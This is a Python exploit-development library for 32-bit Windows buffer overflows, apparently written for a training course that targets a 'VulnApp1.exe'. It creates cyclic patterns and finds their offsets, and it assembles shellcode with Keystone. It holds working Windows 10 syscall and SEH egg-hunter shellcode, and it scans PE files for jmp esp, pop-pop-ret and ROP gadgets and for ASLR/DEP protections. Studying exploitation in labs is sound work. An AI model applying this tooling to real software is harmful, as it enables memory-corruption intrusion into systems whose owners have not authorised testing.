"""
Lib for automation some of the exploit process

Credits to ickerwx for pattern create and offset code that was written in python2
https://github.com/ickerwx/pattern

Classes:
    Pattern
    Instructions
    Rop

Functions:
    test

Misc variables:
    test
"""
import sys
import struct  
import keystone as ks
import capstone as cs
import pefile

class Pattern():
    """
    A class to access pattern_offset and pattern_create

    Methods
    -------
    print_help():
        Print usage for standalone scripts

    pattern_create():
        Return pattern as STRING length is determined in constructor, convert to bytes before sending in buffer ie. bytes(pattern,"ascii")

    pattern_offset(value=0xffffff):
        Return pattern offset as int
    """
    def __init__(self,buffer_length):
        """
        Constructs all the neccesary attributes for the pattern object

        Parameters:
        -----------
        buffer_length : int
            length of buffer for pattern create and offset
        """
        self.buffer_length = buffer_length

    def print_help():
        print(f"Usage: {sys.argv[0]} (create | offset) <value> <buflen>")
        sys.exit(0)

    def pattern_create(self):
        length = self.buffer_length
        pattern = ""
        parts = ["A","a","0"]
        try:
            if not isinstance(length,(int)):
                length = int(length)
        except Exception as e:
            print(f"::: Error creating pattern -> {e} :::")
            self.print_help()
        while len(pattern) != length:
            pattern += parts[len(pattern) % 3]
            if len(pattern) % 3 == 0:
                parts[2] = chr(ord(parts[2]) + 1)
                if parts[2] > '9':
                    parts[2] = '0'
                    parts[1] = chr(ord(parts[1])+1)
                    if parts[1] > 'z':
                        parts[1] = 'a'
                        parts[0] = chr(ord(parts[0]) +1)
                        if parts[0] > 'Z':
                            parts[0] = 'A'
        return pattern
    
    def pattern_offset(self,offset_value):
        length = self.buffer_length
        value = offset_value
        try:
            if not isinstance(value,int) and value.startswith("0x"):
                value_stripped = value.strip("0x")
                value = struct.pack("<I",int(value_stripped,16))
            elif not isinstance(value,int):
                value = struct.pack("<I",int(value,16))
            else:
                value = struct.pack("<I",int(value))
        except Exception as e:
            print(f"::: Failed to pack offset -> {e} :::")
            return False
        try:
            str_value = value.decode("ascii")
            pattern = self.pattern_create()
        except Exception as e:
            print(f"::: Failed to decode offset to ascii -> {e} :::")
            return False
        try:
            return pattern.index(str_value)
        except Exception as e:
            return "Offset Not Found"


class Instructions():
    """
    A class to access convert assembly to shellcode bytes

    Methods
    -------
    convert_shellcode(list("jmp esp     ;")):
        convert list of assembly strings into shellcode

    Variables
    ---------
    """    
    def convert_shellcode(assembly):
        eng = ks.Ks(ks.KS_ARCH_X86,ks.KS_MODE_32)
        shellcode = "\n".join(assembly)
        encoding,count = eng.asm(shellcode,as_bytes=True)
        return encoding
    def create_egg_hunter_sys_call(egg=0x74303077):
        # default egg w00tw00t
        # uses x86 windows 10 syscall number
        if not isinstance(egg,int): raise ValueError("Egg must be an INT in little endian format -> 0x74303077")
        egg_hunter_string = """
         loop_inc_page:
            or dx, 0x0fff           ;
        loop_inc_one:
            inc edx                 ;
        loop_check:
            push edx                ;
            mov eax, 0xfffffe3a     ;
            neg eax                 ;
            int 0x2e                ; 
            cmp al, 05              ; 
            pop edx                 ; 
        loop_check_valid:
            je loop_inc_page        ; 
        is_egg:
            mov eax, {}     ; 
            mov edi, edx            ;
            scasd                   ; 
            jnz loop_inc_one        ; 
            scasd                   ; 
            jnz loop_inc_one        ; 
        matched:
            jmp edi                 ;""".format(hex(egg))
        eng = ks.Ks(ks.KS_ARCH_X86,ks.KS_MODE_32)
        encoding,count = eng.asm(egg_hunter_string,as_bytes=True)
        print("::: Creating Windows 10 Syscall Egg Hunter with egg {} total size {} :::".format(hex(egg),len(encoding)))
        return encoding

    def create_egg_hunter_seh(egg=0x74303077):
        # default egg w00tw00t
        seh_egg_hunter_string = """
        start:
            jmp get_seh_address                 ;
        build_exception_record:
            pop ecx                             ;
            mov eax, {}     ;
            push ecx                            ;
            push 0xffffffff                     ;
            xor ebx,ebx                         ;
            mov dword ptr fs:[ebx], esp         ;
            sub ecx, 0x04                       ;
            add ebx, 0x04                       ;
            mov dword ptr fs:[ebx], ecx         ;
        is_egg:
            push 0x02                           ;
            pop ecx                             ;
            mov edi,ebx                         ;
            repe scasd                          ;
            jnz loop_inc_one                    ;
            jmp edi                             ;
        loop_inc_page:
            or bx,0xfff                         ;
        loop_inc_one:
            inc ebx                             ;
            jmp is_egg                          ;
        get_seh_address:
            call build_exception_record         ;
            push 0x0c                           ;
            pop ecx                             ;
            mov eax,[esp+ecx]                   ;
            mov cl,0xb8                         ;
            add dword ptr ds:[eax+ecx],0x06     ;
            pop eax                             ;
            add esp, 0x10                       ;
            push eax                            ;
            xor eax,eax                         ;
            ret                                 ;""".format(hex(egg))
        eng = ks.Ks(ks.KS_ARCH_X86,ks.KS_MODE_32)
        encoding,count = eng.asm(seh_egg_hunter_string,as_bytes=True)
        print("::: Creating SEH egghunter with egg {} total size {}:::".format(hex(egg),len(encoding)))
        return encoding


class Rop():
    """
    A class to access resolve rop gadgets as well as pop pop ret instructions and jmp esp
    Also contains methods to view PE information

    Methods
    -------
    print_information:
        print pe information
    find_rop_gadgets:
        print rop gadgets
    find_pop_pop_ret:
        print and returns a single pop pop return address
    find_jmp_esp::
        print and returns a single jmp esp address
    """        
    def __init__(self,path):
        self.path_to_pe = path
        self.csEngine = cs.Cs(cs.CS_ARCH_X86,cs.CS_MODE_32)
        self.csEngine.skipdata = True # will skip invalid opcodes
        self.pe = pefile.PE(self.path_to_pe,fast_load=True)
        self.image_base = self.pe.OPTIONAL_HEADER.ImageBase
        self.entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        self.dll_char = self.pe.OPTIONAL_HEADER.DllCharacteristics
        self.size_of_text_section = self.pe.OPTIONAL_HEADER.SizeOfCode

    def print_information(self):
        base_address_of_code_rva = self.pe.OPTIONAL_HEADER.BaseOfCode
        text_section_start = self.image_base + base_address_of_code_rva
        text_section_end = self.image_base + base_address_of_code_rva + self.size_of_text_section
        print("::: Information :::")
        print("Entry Point ->",hex(self.entry_point + self.image_base))
        print("Image Base  ->",hex(self.image_base))
        print("Image End   ->",hex(self.pe.OPTIONAL_HEADER.SizeOfImage+self.image_base))
        print("Size .text  ->",hex(self.size_of_text_section))
        print(".text start ->",hex(text_section_start))
        print(".text end   ->",hex(text_section_end))
        print("::: Sections :::")
        for section in self.pe.sections:
            print(section.Name.decode("ascii"),hex(section.VirtualAddress),section.SizeOfRawData)
        print("::: Protections :::")
        self.check_protections()

    def check_protections(self):
        if self.dll_char & 0x0040:
            print("::: ASLR Enabled ::: ")
        if self.dll_char & 0x0100:
            print("::: DEP Enabled :::")
        if self.dll_char & 0x4000:
            print("::: CFG Supported :::")
        if self.dll_char & 0x0400:
            print("::: SEH Not Used :::")
            
    def find_jmp_esp(self):
        print("::: Finding jmp esp :::")
        print("::: Searching .text only :::")
        data = self.pe.sections[0].get_data()[::]
        for (address,size,mnemonic,op_str) in self.csEngine.disasm_lite(data,self.pe.sections[0].VirtualAddress):
            if mnemonic == "jmp" and op_str == "esp":
                absolute_addr = self.image_base + address
                print("::: Found jmp esp :::")
                print("::: {} ::: {} ::: {} {}".format(hex(absolute_addr),hex(address),mnemonic,op_str))
                return absolute_addr

    def find_pop_pop_ret(self):
        print("::: Finding Pop Pop Ret :::")
        print("::: Searching .text only :::")
        data = self.pe.sections[0].get_data()[::]
        print(len(data))
        possible_addresses = []
        pop_pop_ret = []
        for (address,size,mnemonic,op_str) in self.csEngine.disasm_lite(data,self.pe.sections[0].VirtualAddress):
            if mnemonic == "pop" or mnemonic == "ret":
                absolute_addr = self.image_base + address
                address_and_opcodes = {
                    "absolute_addr":absolute_addr,
                    "address":address,
                    "mnemonic":mnemonic,
                    "op_str":op_str
                }
                possible_addresses.append(address_and_opcodes)
        for x in range(len(possible_addresses)-1):
            try:
                if possible_addresses[x]["address"] + 1 == possible_addresses[x+1]["address"] and possible_addresses[x]["address"] + 2 == possible_addresses[x+2]["address"] and possible_addresses[x+2]["mnemonic"] == "ret" and possible_addresses[x+2]["op_str"] == "":
                        print("::: {}  {}  {} {}".format(hex(possible_addresses[x]["absolute_addr"]),hex(possible_addresses[x]["address"]),possible_addresses[x]["mnemonic"],possible_addresses[x]["op_str"]),end=" ::: ")
                        print("::: {}  {}  {} {}".format(hex(possible_addresses[x+1]["absolute_addr"]),hex(possible_addresses[x+1]["address"]),possible_addresses[x+1]["mnemonic"],possible_addresses[x+1]["op_str"]),end=" ::: ")
                        print("::: {}  {}  {} {}".format(hex(possible_addresses[x+2]["absolute_addr"]),hex(possible_addresses[x+2]["address"]),possible_addresses[x+2]["mnemonic"],possible_addresses[x+2]["op_str"]))
                        pop_pop_ret.append(possible_addresses[x])
                        x+=2
            except Exception as e:
                break
        return pop_pop_ret[-1]["absolute_addr"]

    def find_rop_gadgets(self,specific_mnemonic=None):
        data = self.pe.sections[0].get_data()[::]
        for (address,size,mnemonic,op_str) in self.csEngine.disasm_lite(data,self.pe.sections[0].VirtualAddress):
                absolute_addr = self.image_base + address
                print("::: {} ::: {} ::: {} {}".format(hex(absolute_addr),hex(address),mnemonic,op_str))


if __name__ == "__main__":
    #print(Instructions.create_egg_hunter_seh(0x74303077))

    '''
    #Instruciton Class
    Instructions.convert_shellcode(["jmp esp           ;"])

    #Rop Class
    Rop("..\Chapter3\VulnApp1.exe").find_pop_pop_ret()
    Rop("..\Chapter3\VulnApp1.exe").find_jmp_esp()
    Rop("..\Chapter3\VulnApp1.exe").print_information()

    #Pattern Class
    return bytes(Pattern(length).pattern_create(),"ascii")
    return Pattern(length).pattern_offset(0x33794332)
    '''

